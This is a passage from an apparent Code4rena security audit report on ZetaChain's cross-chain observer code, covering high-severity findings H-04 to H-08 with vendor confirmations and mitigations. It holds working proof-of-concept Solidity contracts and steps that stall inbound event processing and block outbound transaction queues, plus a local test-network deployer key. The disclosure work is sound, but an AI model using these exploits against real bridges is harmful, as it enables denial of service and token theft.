Subsequently, the observers will repeatedly try to vote on it, but keep failing. In the end, this stuck cctx blocks the outbound transaction queue due to the maximum lookahead nonce check. As a result, no further outbound transactions are sent.

### Recommended mitigation steps

Consider carefully checking the emitter address of critical events, such as the `ZetaReceived` in [`evm_client.go#L386`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L386), the `ZetaReverted` event in [`evm_client.go#L423`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L423), and the `Withdrawn` event in [`evm_client.go#L490`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L490).

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/418#issuecomment-1877370368)**

***

## [[H-04] A malicious inbound transaction can prevent subsequent events from being processed by observers](https://github.com/code-423n4/2023-11-zetachain-findings/issues/416)
*Submitted by berndartmueller ([1](https://github.com/code-423n4/2023-11-zetachain-findings/issues/416), [2](https://github.com/code-423n4/2023-11-zetachain-findings/issues/397)), also found by [QiuhaoLi](https://github.com/code-423n4/2023-11-zetachain-findings/issues/485)*

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L859> 

<https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L901>

An attacker can send an inbound ERC-20 deposit or Zeta transaction with a `message` exceeding the maximum length limit and causing all other subsequent inbound transactions that occur in the same block range (i.e., `startBlock` to `toBlock`) to be ignored by the observers.

### Proof of Concept

> **Please note:** The outlined issue in this submission is different than the medium severity issue reported in "EVM RPC errors may lead to missed inbound transactions" as it can be actively exploited.

ZetaChain observers watch external EVM chains via the `ExternalChainWatcher` function that internally [calls the `observeInTX` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L725) on each `ob.GetCoreParams().InTxTicker` ticker.

The `observeInTX` function performs multiple tasks:

1.  Query for zeta sent (`ZetaSent`) logs
2.  Query for ERC-20 deposited logs
3.  Query tx's that are sent to the TSS address

The queried blocks are bound by the range of `startBlock` and `toBlock`, which are set in lines `809-810`. The `startBlock` is the previously processed `toBlock` (i.e., retrieved via `ob.GetLastBlockHeightScanned()`), incremented by 1.

At the end of the function, [in line `988`, the `toBlock` is set as the new `lastBlockHeightScanned`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L988).

However, if calling `PostSend` in lines [`856`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L856) and [`898`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L898) errors, the `for` loop is exited early via the subsequent `return` statement.

Consequently, the `observeInTX` function proceeds to store the `toBlock` as the new `lastBlockHeightScanned`, even though the blocks (and their logs) have not been fully processed.

An attacker can exploit this issue with an inbound transaction that has a `message` exceeding the maximum length of [`MaxMessageLength = 10240`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L15). This [upper bound on the message length is enforced in the `MsgVoteOnObservedInboundTx` message's `ValidateBasic` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L88-L90) and [prevents observers from sending such a message to ZetaChain](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/tx.go#L74) as well as also preventing any further processing of the message in case it reaches ZetaChain.

Specifically, both the [`ERC20Custody.deposit`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L169) and the [`ZetaConnectorEth.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L42) function allow specifying an arbitrary `message`.

### PoC

1.  Spin up the smoke tests for a local test environment via `make start-smoketest`

2.  Setup Remix (or similar), Metamask (or similar) with the local ETH network and the **deployer** account (which has already sufficient Zeta tokens)
    *   Private key: `d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263`
    *   Address: `0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`

3.  Deploy the following `SimulateAttack` Solidity contract to the local ETH network:

<details>

    ```solidity
    // SPDX-License-Identifier: GPL-3.0

    pragma solidity ^0.8.0;

    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

    interface ZetaInterfaces {
        /**
        * @dev Use SendInput to interact with the Connector: connector.send(SendInput)
        */
        struct SendInput {
            /// @dev Chain id of the destination chain. More about chain ids https://docs.zetachain.com/learn/glossary#chain-id
            uint256 destinationChainId;
            /// @dev Address receiving the message on the destination chain (expressed in bytes since it can be non-EVM)
            bytes destinationAddress;
            /// @dev Gas limit for the destination chain's transaction
            uint256 destinationGasLimit;
            /// @dev An encoded, arbitrary message to be parsed by the destination contract
            bytes message;
            /// @dev ZETA to be sent cross-chain + ZetaChain gas fees + destination chain gas fees (expressed in ZETA)
            uint256 zetaValueAndGas;
            /// @dev Optional parameters for the ZetaChain protocol
            bytes zetaParams;
        }
    }

    interface ZetaConnector {
        function send(ZetaInterfaces.SendInput calldata input) external;
    }

    contract SimulateAttack {
        ZetaConnector public connector = ZetaConnector(0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9);
        ERC20 public zeta = ERC20(0xA8D5060feb6B456e886F023709A2795373691E63);

        function simulateAttack(uint256 amount, uint256 gasLimit, uint256 length) external {
            sendMaliciousMessage(amount, gasLimit, length);

            // Pretend this message was sent by someone else in a subsequent transaction/block
            sendLegitimateMessage(1.337e18, 100_000);
        }

        function sendMaliciousMessage(uint256 amount, uint256 gasLimit, uint256 length) public {
            // Create a bytes message with a non-zero character length of length
            bytes memory message = new bytes(length);
            // fill with non-zero data
            for (uint256 i = 0; i < length; i++) {
                message[i] = bytes1(uint8(1));
            }

            ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
                1337,
                abi.encodePacked(address(this)),
                gasLimit,
                message,
                amount,
                ""
            );

            zeta.transferFrom(msg.sender, address(this), amount);
            zeta.approve(address(connector), amount);

            connector.send(input);
        }

        // Pretend this message was sent by someone else in a subsequent transaction/block
        function sendLegitimateMessage(uint256 amount, uint256 gasLimit) public {
            ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
                1337,
                abi.encodePacked(address(this)),
                gasLimit,
                "",
                amount,
                ""
            );

            zeta.transferFrom(msg.sender, address(this), amount);
            zeta.approve(address(connector), amount);

            connector.send(input);
        }
    }
    ```
</details>

4.  Approve the `SimulateAttack` contract as the Zeta token spender for the deployer (`0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`) address. An unlimited allowance is recommended for simplicity.

5.  With the **deployer** account, call the `simulateAttack` function with the following parameters:

    *   `amount`: `3000000000000000000` (i.e., `3e18`)
    *   `gasLimit`: `100000`
    *   `length`: `10240` (slightly less would also work due to the observer's [internal base64 encoding](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/utils.go#L129))

    This function sends two messages (i.e., `ZetaSent` events): An attacker's message with a very long `message`, and a second legitimate message, pretending to be sent by someone else (in a different tx/block).

6.  Watch the observer (zetacore) logs via `docker logs zetaclient0 -f --tail 100`

7.  Notice the `ERR error posting to zeta core` error once the first event is picked up:

    ```
    2023-12-16T22:08:12Z INF Checking for all inTX : startBlock 411, toBlock 411 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:14Z INF Checking for all inTX : startBlock 412, toBlock 412 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:16Z INF Checking for all inTX : startBlock 413, toBlock 413 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:16Z INF TxBlockNumber 413 Transaction Hash: 0x335c2abe18cd64b10f8d60dd554c2c54ec1f8225b54ee84895a8ab795688c339 Message :  chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:16Z ERR error posting to zeta core error="/zetachain.zetacore.crosschain.MsgVoteOnObservedInboundTx invalid msg | message is too long: 13656: invalid request" chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:18Z INF Checking for all inTX : startBlock 414, toBlock 414 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:20Z INF Checking for all inTX : startBlock 415, toBlock 415 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:22Z INF Checking for all inTX : startBlock 416, toBlock 416 chain=goerli_localnet module=ExternalChainWatcher
    2023-12-16T22:08:24Z INF Checking for all inTX : startBlock 417, toBlock 417 chain=goerli_localnet module=ExternalChainWatcher
    ```

    Thereafter, the second `ZetaSent` event is ignored.

### Recommended mitigation steps

Consider only skipping the "invalid" event and continue processing the remaining events to ensure all events are processed and voted upon.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/416#issuecomment-1877314791)**

***

## [[H-05] Disabling outbound transactions is ineffective and allows for Zeta token theft](https://github.com/code-423n4/2023-11-zetachain-findings/issues/414)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/414), also found by [ChristiansWhoHack](https://github.com/code-423n4/2023-11-zetachain-findings/issues/332) and [dontonka](https://github.com/code-423n4/2023-11-zetachain-findings/issues/160)*

Outbound EVM transactions can not be disabled and will be wrongly sent out, either stealing Zeta tokens or manifesting in a loss for users who attempt to withdraw gas or ERC-20 tokens.

### Proof of Concept

In lines [`530-544` of the `TryProcessOutTx` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L530-L544), called by the observer's EVM signer to send an outbound cctx transaction to the receiver chain, the [`SignOutboundTx`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L140-L168) function is invoked to sign the transaction tx.

This transaction has the [Zeta connector contract as the `to` address and the ABI encoded `onReceive` function call as the calldata](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L157-L162). As a result, the connector contract, e.g., the `ZetaConnectorEth` contract, has the `onReceive` function called and [subsequently transfers Zeta tokens to the `destinationAddress`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L60).

Now let's re-visit a critical part of the `TryProcessOutTx` function, specifically, lines [`439-544`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L439-L544):

```go
439: 	if send.GetCurrentOutTxParam().CoinType == common.CoinType_Cmd { // admin command
... 		// [...]
452: 	} else if send.InboundTxParams.SenderChainId == common.ZetaChain().ChainId && send.CctxStatus.Status == types.CctxStatus_PendingOutbound && flags.IsOutboundEnabled {
453: 		if send.GetCurrentOutTxParam().CoinType == common.CoinType_Gas {
... 			  // [...]
462: 		}
463: 		if send.GetCurrentOutTxParam().CoinType == common.CoinType_ERC20 {
... 			  // [...]
475: 		}
476: 		if send.GetCurrentOutTxParam().CoinType == common.CoinType_Zeta {
... 			  // [...]
490: 		}
491: 	} else if send.CctxStatus.Status == types.CctxStatus_PendingRevert && send.OutboundTxParams[0].ReceiverChainId == common.ZetaChain().ChainId {
... 		// [...]
515: 	} else if send.CctxStatus.Status == types.CctxStatus_PendingRevert {
... 		// [...]
530: 	} else if send.CctxStatus.Status == types.CctxStatus_PendingOutbound {
... 		// [...]
532: 		tx, err = signer.SignOutboundTx(
533: 			ethcommon.HexToAddress(send.InboundTxParams.Sender),
534: 			big.NewInt(send.InboundTxParams.SenderChainId),
535: 			to,
536: 			send.GetCurrentOutTxParam().Amount.BigInt(),
537: 			gasLimit,
538: 			message,
539: 			sendhash,
540: 			send.GetCurrentOutTxParam().OutboundTxTssNonce,
541: 			gasprice,
542: 			height,
543: 		)
544: 	}
```

Here, the type of transaction signature is determined, based on the coin type, the originator (`SenderChainId`), and the status of the cctx.

The possible states are as follows (the order is important):

1.  Line 439: Admin command
2.  Line 452: Pending outbound cctx, originating from ZetaChain. Additionally, in lines `453`, `463`, and `476`, the coin type is checked to determine the specific type of transaction.
3.  Line 491: Revert a failed cctx that was originally sent to ZetaChain
4.  Line 515: Revert a failed cctx that was originally sent to an external chain
5.  Line 530: Pending outbound cctx. No matter the coin type, it will always result in a Zeta token transfer

In the second state, in line [`452`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L452), it is also checked if outbound transactions are generally enabled (`flags.IsOutboundEnabled`) and if they are disabled, this `else if` block is skipped while the `if` in line [`530`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L530) evaluates to `true`.

However, this is problematic in two ways:

1.  Even though outbound transactions are disabled, cctxs are still sent out.
2.  No matter the coin type of the pending outbound cctx, it will be signed via `SignOutboundTx` and resulting in a Zeta token transfer

For the second case, consider a pending outbound cctx with the coin type `common.CoinType_ERC20` where the ERC-20 `asset` is worth less than the Zeta token (please note that [ERC-20 tokens are restricted by a whitelist](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ERC20Custody.sol#L174-L176)).

As a result of this issue, the recipient of the cctx receives Zeta tokens instead of the lower-valued ERC-20 tokens, effectively stealing Zeta tokens for profit. Moreover, if users attempt to withdraw gas or ERC-20 tokens that have a higher value than the Zeta token, users will receive a total value Zeta tokens less than their original gas/ERC-20 tokens, resulting in a loss.

### Recommended mitigation steps

Consider refactoring the control flow by first checking if outbound transactions are enabled (the `CoinType_Cmd` cctx can be exempted from this check), and only then continue with the other checks.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/414#issuecomment-1882122816)**

***

## [[H-06] zEVM cross-chain messages ignore the user-specified message and prevent calling the destination contract](https://github.com/code-423n4/2023-11-zetachain-findings/issues/413)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/413), also found by [MevSec](https://github.com/code-423n4/2023-11-zetachain-findings/issues/570)*

Cross-chain Zeta messages originating from the zEVM have an empty `message` field, preventing the `destinationAddress` contract from being called.

This renders the cross-chain messaging functionality useless as the `message` is never used and potentially causes a loss of funds (if assets have been burned on the zEVM) or locked funds (if unable to unlock on the receiver end).

### Proof of Concept

zEVM transactions are post-processed in the [`PostTxProcessing`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L42-L44) function of the `x/crosschain` module. Specifically, the goal is to parse and process `ZetaSent` and ZRC-20 `Withdrawal` events and send them to the corresponding, external receiver chains.

Any emitted `ZetaSent` events are parsed and processed in the [`ProcessZetaSentEvent`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L172-L246) function. This event is emitted by the [`ZetaConnectorZEVM.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/ZetaConnectorZEVM.sol#L92-L108) function to send a cross-chain message to an external chain.

The message input, [`ZetaInterfaces.SendInput`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/zevm/ZetaConnectorZEVM.sol#L8-L21), allows the sender to specify a `message` that is forwarded to the receiver contract (`destinationAddress`) on the destination chain.

Specifically, once the cross-chain message is received by the `onReceive` function of the ZetaConnector contract on the receiver chain (e.g., [`ZetaConnectorEth`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L15) or [`ZetaConnectorNonEth`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.non-eth.sol#L15)), the [`destinationAddress`'s `onZetaMessage` function is called](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L64-L66) and the `message` is provided as a parameter.

However, the user-specified `message` is not used, instead, it is [overwritten by an empty string in line 221](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/evm_hooks.go#L221).

```go
172: func (k Keeper) ProcessZetaSentEvent(ctx sdk.Context, event *connectorzevm.ZetaConnectorZEVMZetaSent, emittingContract ethcommon.Address, txOrigin string) error {
...  	// [...]
212:
213: 	// Bump gasLimit by event index (which is very unlikely to be larger than 1000) to always have different ZetaSent events msgs.
214: 	msg := types.NewMsgVoteOnObservedInboundTx(
215: 		"",
216: 		emittingContract.Hex(),
217: 		senderChain.ChainId,
218: 		txOrigin, toAddr,
219: 		receiverChain.ChainId, /
220: 		amount,
221: ❌		"",
222: 		event.Raw.TxHash.String(),
223: 		event.Raw.BlockNumber,
224: 		90000,
225: 		common.CoinType_Zeta,
226: 		"",
227: 		event.Raw.Index,
228: 	)
229: 	sendHash := msg.Digest()
230:
231: 	// Create the CCTX
232: 	cctx := k.CreateNewCCTX(ctx, msg, sendHash, tss.TssPubkey, types.CctxStatus_PendingOutbound, &senderChain, receiverChain)
...  	// [...]
246: }
```

As a result, the destination contract is [never called as the `message` is empty](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L63).

### Recommended mitigation steps

Consider using the user-specified `message` instead of overwriting it with an empty string.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/413#issuecomment-1877311449)**

***

## [[H-07] Outbound transactions that can not be broadcasted to an external EVM chain cause a Denial of Service of all outgoing transactions to this chain](https://github.com/code-423n4/2023-11-zetachain-findings/issues/412)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/412)*

Outgoing transactions to an external EVM chain can be maliciously blocked by crafting a cctx that can not be broadcasted, i.e., causing the RPC to error (with an error that is not handled in the `HandleBroadcastError` function).

For example, causing the intrinsic gas limit to exceed the provided gas limit (minimum `100k`) prevents the transaction from being included in the EVM mempool and blocks the queue of pending outgoing transactions to this external chain.

This is non-recoverable and requires manual intervention and coordination of all validators (observers) to fix the blocking nonce.

### Proof of Concept

Observers retry failed outbound transaction broadcasts for a maximum of 5 retries. Subsequently, in the last retry attempt, the `for` loop is exited in line [`579`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L579) and the function execution is finished.

*Please note that the [`HandleBroadcastError`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L335-L350) function in line `570` only handles certain RPC errors and otherwise, simply instructs a retry.*

On the next ticker, the `TryProcessOutTx` function attempts to send this cctx again but continues to fail. As nonces on the external chain have to be sequential without gaps, any other transactions are blocked from being sent to this external chain.

```go
562:// retry loop: 1s, 2s, 4s, 8s, 16s in case of RPC error
563:for i := 0; i < 5; i++ {
564:	logger.Info().Msgf("broadcasting tx %s to chain %s: nonce %d, retry %d", outTxHash, toChain, send.GetCurrentOutTxParam().OutboundTxTssNonce, i)
565:	// #nosec G404 randomness is not a security issue here
566:	time.Sleep(time.Duration(rand.Intn(1500)) * time.Millisecond) // FIXME: use backoff
567:	err := signer.Broadcast(tx)
568:	if err != nil {
569:		log.Warn().Err(err).Msgf("OutTx Broadcast error")
570:		retry, report := HandleBroadcastError(err, strconv.FormatUint(send.GetCurrentOutTxParam().OutboundTxTssNonce, 10), toChain.String(), outTxHash)
571:		if report {
572:			zetaHash, err := zetaBridge.AddTxHashToOutTxTracker(toChain.ChainId, tx.Nonce(), outTxHash, nil, "", -1)
573:			if err != nil {
574:				logger.Err(err).Msgf("Unable to add to tracker on ZetaCore: nonce %d chain %s outTxHash %s", send.GetCurrentOutTxParam().OutboundTxTssNonce, toChain, outTxHash)
575:			}
576:			logger.Info().Msgf("Broadcast to core successful %s", zetaHash)
577:		}
578:		if !retry {
579:			break
580:		}
581:		backOff *= 2
582:		continue
583:	}
584:	logger.Info().Msgf("Broadcast success: nonce %d to chain %s outTxHash %s", send.GetCurrentOutTxParam().OutboundTxTssNonce, toChain, outTxHash)
585:	zetaHash, err := zetaBridge.AddTxHashToOutTxTracker(toChain.ChainId, tx.Nonce(), outTxHash, nil, "", -1)
586:	if err != nil {
587:		logger.Err(err).Msgf("Unable to add to tracker on ZetaCore: nonce %d chain %s outTxHash %s", send.GetCurrentOutTxParam().OutboundTxTssNonce, toChain, outTxHash)
588:	}
589:	logger.Info().Msgf("Broadcast to core successful %s", zetaHash)
590:	break // successful broadcast; no need to retry
591:}
```

### How to exploit

[The EVM validates the incoming transaction to exclude transactions with basic errors, such as insufficient intrinsic gas](https://github.com/ethereum/go-ethereum/blob/69576df2544d9a6c59c5659b82a064edc9845874/core/txpool/legacypool/legacypool.go#L977-L984), before being put into the mempool.

In regards to the intrinsic gas, a single non-zero byte of transaction data [costs 16 gas](https://github.com/ethereum/go-ethereum/blob/f1794ba2788baf34489847bfa9ca00e067507db0/params/protocol_params.go#L93), plus an additional [flat fee of `21_000`](https://github.com/ethereum/go-ethereum/blob/f1794ba2788baf34489847bfa9ca00e067507db0/params/protocol_params.go#L36). For more details on how the intrinsic gas is calculated, see the EVM's [`IntrinsicGas` function](https://github.com/ethereum/go-ethereum/blob/f1794ba2788baf34489847bfa9ca00e067507db0/core/state_transition.go#L69-L116).

[If the transaction's gas limit is insufficient to cover the intrinsic gas, the transaction will be rejected, and the RPC call will result in an error.](https://github.com/ethereum/go-ethereum/blob/f1794ba2788baf34489847bfa9ca00e067507db0/core/txpool/validation.go#L99-L105)

This fact can be exploited, e.g., by sending a Zeta cross-chain message from an external chain A to chain B via the [`ZetaConnectorEth.send`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L31-L45) function. Specifically, an attacker can provide a message, `input.message`, with a length that ultimately exceeds the maximum message limit of [`MaxMessageLength = 10240`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L15) (this [maximum length is enforced in the `MsgVoteOnObservedInboundTx` message's `ValidateBasic` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/types/message_vote_on_observed_inbound_tx.go#L88-L90) and [prevents observers from sending such a message to ZetaChain](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/tx.go#L74) as well as also preventing any further processing of the message in case it reaches ZetaChain).

As the maximum message length is not exceeded, the inbound transaction is sent to ZetaChain, and once it's successfully voted upon, the resulting cctx is put into the pending queue of outgoing transactions.

Subsequently, observers will [process the cctx](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L143) and attempt to send the transaction to the external chain B by collectively signing and [broadcasting the message to the chain](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L567).

Given that the provided message and its length is `7680` (please refer to the [PoC](#simple-poc) below for details on how this value is chosen), the intrinsic gas cost is `7680 * 16 = 122880 + flat fee of 21k = ~144k` and the transaction **must** have at least this amount of gas to be accepted by the RPC.

However, sending Zeta messages allows [specifying](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L41) an arbitrary (non-zero) destination gas limit, which is [lower-bounded to `100_000`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_signer.go#L375-L378).

Consequently, the gas limit can be forced to be set to `100k`. Attempting to broadcast such a transaction to the EVM RPC will result in an error due to the validation of the intrinsic gas costs of `~144k` and the insufficient provided gas of `100k`.

### Simple PoC

The following Solidity contract demonstrates how such a cross-chain message with the maximum message length of `10240` can be crafted:

[Internally, the observer encodes the message to base64](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/utils.go#L165), thus increasing the length of the message by roughly a [factor of 4/3](https://en.wikipedia.org/wiki/Base64). Consequently, to not exceed the maximum message length, the message length is set to `10240 * 3/4 = 7680` in Solidity.

```solidity
contract ZetaChain is ZetaReceiver {
    ZetaConnector public connector = ZetaConnector(0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9);
    IERC20 public zeta = IERC20(0xA8D5060feb6B456e886F023709A2795373691E63);

    function send(uint256 amount, uint256 gasLimit) external {
        uint256 length = 7680;

        bytes memory message = new bytes(length);
        // fill with non-zero data
        for (uint256 i = 0; i < length; i++) {
            message[i] = bytes1(uint8(1));
        }

        ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
            1337,
            abi.encodePacked(address(this)),
            gasLimit,
            message,
            amount,
            ""
        );

        zeta.transferFrom(msg.sender, address(this), amount);
        zeta.approve(address(connector), amount);

        connector.send(input);
    }
}
```

Calling this `send` function on the custom deployed `ZetaChain` contract on Ethereum, with `amount = 4e18` and `gasLimit = 100_000`, causes the `ZetaSent` event to be emitted and picked up by the observers.

Once the transaction is sent to ZetaChain and finalized, observers attempt to broadcast the transaction to the receiver chain but fail with the following RPC error:

```
ERR Broadcast error: nonce 3 chain chain_name:goerli_localnet chain_id:1337  outTxHash 0x749c4e60f0428ba4f558bfca892dca5ba70bc9542e26f1f978240eaf0d5d73fe; retrying... error="intrinsic gas too low"
```

### Recommended mitigation steps

Consider properly handling a repeatedly failed RPC call in the `TryProcessOutTx` function and ensure that such a blocked (pending) nonce can be fixed, i.e., assigned to another cctx that can be broadcasted.

Additionally, consider lowering the maximum message length or adjusting the minimum gas limit to ensure the intrinsic gas costs are covered.

**[lumtis (ZetaChain) confirmed](https://github.com/code-423n4/2023-11-zetachain-findings/issues/412#issuecomment-1877014848)**

***

## [[H-08] Tombstoned observer can maliciously add a duplicate observer address resulting in forfeiting voting rewards of targeted observers](https://github.com/code-423n4/2023-11-zetachain-findings/issues/411)
*Submitted by [berndartmueller](https://github.com/code-423n4/2023-11-zetachain-findings/issues/411), also found by [kuprum](https://github.com/code-423n4/2023-11-zetachain-findings/issues/356) and [p0wd3r](https://github.com/code-423n4/2023-11-zetachain-findings/issues/203)*

1.  If the `ObserverList` contains duplicates, any [newly created ballots will have duplicates in their `VoterList`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/keeper_utils.go#L74). As a result, this prevents an observer from receiving voting rewards as the reward for the legitimate vote would be offset by the [penalty received for missing the vote for the duplicate observer address](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/types/ballot.go#L88) ([repeatedly voting for a ballot with the same address does not work](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/types/ballot.go#L11)).
2.  Removing an observer (e.g., due to the validator leaving the network or due to slashing) that has duplicates will only remove the first occurrence of the address in the list. See [node/x/observer/keeper/hooks.go#L142](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/hooks.go#L142). The other occurrences will remain in the list and [allow](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/keeper_utils.go#L37) the observer to [continue to post new light-client block headers](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_add_block_header.go#L19).

### Proof of Concept

The `MsgUpdateObserver` message, handled in the [`UpdateObserver`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/observer/keeper/msg_server_update_observer.go#L12) function, allows the admin or an ([tombstoned](https://docs.cosmos.network/v0.45/modules/slashing/07\_tombstone.html)) observer to update the observer address.

